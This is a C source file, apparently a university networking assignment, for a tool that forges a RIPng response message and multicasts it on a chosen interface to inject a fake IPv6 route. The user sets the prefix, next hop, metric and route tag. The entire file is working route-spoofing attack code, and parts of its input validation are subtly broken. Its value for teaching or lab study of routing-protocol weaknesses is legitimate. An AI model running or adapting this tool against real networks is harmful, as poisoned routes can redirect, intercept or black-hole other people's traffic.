/* Projekt ISA - Aplikace pro podvrhnuti falesne RIPng routy
 * Anton Firc (xfirca00)
 * 2018/2019
 * 
 * Zdroje:
 *          https://www.tcpdump.org/sniffex.c
 *          https://www.iana.org/assignments/rip-types/rip-types.xhtml#rip-types-4
 *          https://www.gnu.org/software/libc/manual/html_node/Example-of-Getopt.html
 *          https://stackoverflow.com/questions/3736335/tell-whether-a-text-string-is-an-ipv6-address-or-ipv4-address-using-standard-c-s
 *          https://sites.google.com/site/amitsciscozone/home/important-tips/ipv6/ripng
 *          
 */
#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <byteswap.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include<net/ethernet.h>
#include<netinet/ip.h> 
#include <unistd.h>
#include <net/if.h>
#include <netdb.h>

#include"myripsniffer.h"

/* Checks if string is IPv6 address; taken from stackoverflow.com */
int check_addr(char* ipv6) {
    struct addrinfo hint, *res = NULL;
    int ret;

    memset(&hint, '\0', sizeof hint);

    hint.ai_family = PF_UNSPEC;
    hint.ai_flags = AI_NUMERICHOST;

    ret = getaddrinfo(ipv6, NULL, &hint, &res);
    if (ret) {
        fprintf(stderr, "Invalid nezt-hop IP address/n");
        return 1;
    }
    if (res->ai_family == AF_INET6) {
        
    } else {
        fprintf(stderr, "%s is an is not an IPv6 address!\n",ipv6);
        freeaddrinfo(res);
        return 1;
    }

   freeaddrinfo(res);
   return 0;
}

int main (int argc, char** argv) {
    
    if ((argc < 5) || (argc > 11)) {
        fprintf(stderr, "Error: invalid argument count!\nTry ./myripresponse -i <interface> -r <IPv6>/[16-128] {-n <IPv6>} {-m [0-16]} {-t [0-65535]}\n");    
        return ERR_ARGS;
    }
    
    int iflag, rflag = 0;   //flags for mandatory arguments
    int c;  //getopt
    char *interface;    //name of interface to send fake RIP response message
    char* fake_ip;  // IP address of known network
    int plen = 0;   //prefix length
    char* nhop = "::";  //next-hop IP address
    int metric = 1;
    int r_tag  = 0; //route tag

    opterr = 0;

    /* Ispired by getopt example from gnu.org */
    while ((c = getopt (argc, argv, "i:r:n:m:t:")) != -1)
    switch (c)
        {
        case 'i':
            iflag = 1;
            interface = optarg;
            break;
        case 'r':
            rflag = 1;
            fake_ip = strtok(optarg, "/");  //split ip/prefix by / character
            if(fake_ip)
            if (check_addr(fake_ip)) {  //check if ip is valid IPv6
                return ERR_IP;
            }
            char* p = strtok(NULL, ",");    //get part after /
            if(p) {
                plen = strtol(p, NULL, 0); //get prefix length
            }
            else {
                fprintf(stderr, "Error: Missing prefix length in next-hop address!");
                return ERR_ARGS;
            }
            break;
        case 'n':
            nhop = optarg;
            break;
        case 'm':
            metric = strtol(optarg, NULL, 0);
            break;
        case 't':
            r_tag = strtol(optarg, NULL, 0);
            break;
        case '?':
            if (optopt == 'i')
                fprintf (stderr, "Option -i requires an argument.\n");
            else if (optopt == 'r')
                fprintf (stderr, "Option -r requires an argument.\n");
            else if (optopt == 'n')
                fprintf (stderr, "Option -n requires an argument.\n");
            else if (optopt == 'm')
                fprintf (stderr, "Option -m requires an argument.\n");
            else if (optopt == 't')
                fprintf (stderr, "Option -r requires an argument.\n");
            else if (isprint (optopt))
                fprintf (stderr, "Unknown option `-%c'.\n", optopt);
            else
                fprintf (stderr,
                        "Unknown option character `\\x%x'.\n",optopt);
                return ERR_ARGS;
        default:
            abort ();
    }

    /* Check if mandatory arguments set */
    if (iflag == 0) {
        fprintf (stderr, "Option -i not found!\n");
        return ERR_ARGS;
    }
    if (rflag == 0) {
        fprintf (stderr, "Option -r not found!\n");
        return ERR_ARGS;
    }

    /* Check argument ranges */
    if ((plen < 16) && (plen > 128)) {
        fprintf(stderr, "Error: prefix length must be in range 16-128!\n");
        return ERR_ARGS;
    }
    if (metric > 16) {
        fprintf(stderr, "Error: argument -m must be in range 0-15!\n");
        return ERR_ARGS;
    }
    if (r_tag > 65535) {
        fprintf(stderr, "Error: argument -t must be in range 0-65535!\n");
        return ERR_ARGS;
    }

    int client_socket;
    struct sockaddr_in6 destination;
    struct sockaddr_in6 source;

    printf("***************************\n");
    printf("Fake RIPng response tool\n");
    printf("Response message parameters:\n");
    printf("*Interface:  %s\n", interface);
    printf("*Network IP: %s/%d\n", fake_ip, plen);
    printf("*Next-hop:   %s\n", nhop);
    printf("*Metric:     %d\n", metric);
    printf("*Router tag: %d\n", r_tag);

    /* open IPv6 UDP socket */
    if ((client_socket = socket(AF_INET6, SOCK_DGRAM, 0)) < 0){
        fprintf(stderr, "Error creating socket\n");
        exit(EXIT_FAILURE);
    }

    /* fill in IPv6 multicast destination address and RIPng port */
    bzero(&destination, sizeof(destination));
    destination.sin6_family = AF_INET6;
    inet_pton(AF_INET6, "ff02::9", &destination.sin6_addr);
    destination.sin6_port = htons(521);

    /* fill in source port number and IP family */
    bzero(&source, sizeof(source));
    source.sin6_family = AF_INET6;
    source.sin6_port = htons(521);  

    /* assign address to socket */
    if (bind(client_socket, (struct sockaddr *) &source, sizeof(source)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    /* bind socket to device */
    if(setsockopt(client_socket, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface)) < 0)
    {
        fprintf(stderr, "Error while binding socket to device\n");
        perror("");
        exit(EXIT_FAILURE);
    }
    /* set to multicast */
    unsigned int ifindex;
    ifindex = if_nametoindex(interface);
    if(setsockopt(client_socket, IPPROTO_IPV6, IPV6_MULTICAST_IF, &ifindex,sizeof(ifindex)) < 0)
    {
        fprintf(stderr, "Error while setting up multicast\n");
        perror("");
        exit(EXIT_FAILURE);
    }

    /* set TTL(to enable forwarding beyond a single subnetwork) */
    int hops = 255;
    if(setsockopt(client_socket, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops,sizeof(hops)) < 0)
    {
        fprintf(stderr, "Error while setting TTL\n");
        perror("");
        exit(EXIT_FAILURE);
    }

    struct rip_hdr rip;

    rip.command = 2;
    rip.version = 1;
    rip.zero = htons(0);

    /* Set next hop address entry */
    struct rip_ng next;

    inet_pton(AF_INET6, nhop, &(next.prefix));
    next.r_tag = 0;
    next.metric = 0xFF;
    next.prefix_len = 0;

    /* Known network entry */
    struct rip_ng rip_ng;

    inet_pton(AF_INET6, fake_ip, &(rip_ng.prefix));
    rip_ng.r_tag = r_tag;
    rip_ng.metric = metric;
    rip_ng.prefix_len = plen;

    /* Create RIP response packet */
    unsigned char packet[SIZE_RIP_HDR + SIZE_RIP + SIZE_RIP];
    bzero(&packet, SIZE_RIP + SIZE_RIP_HDR);
    memcpy(packet, (const void *)&rip, SIZE_RIP_HDR);
    memcpy(packet + SIZE_RIP_HDR, (const void *)&next, SIZE_RIP);
    memcpy(packet + SIZE_RIP_HDR + SIZE_RIP, (const void *)&rip_ng, SIZE_RIP);

    /* send packet */
    if (sendto(client_socket, packet, sizeof(packet), 0, (struct sockaddr *)&destination, sizeof(destination)) < 0) {
        fprintf(stderr, "Error: Sending message failed!\n");
        perror("");
        exit(EXIT_FAILURE);
    }
    else {
        printf("**Success ! RIPng response message successfully sent**\n");
    }

    close(client_socket);

    return SUCCESS;
}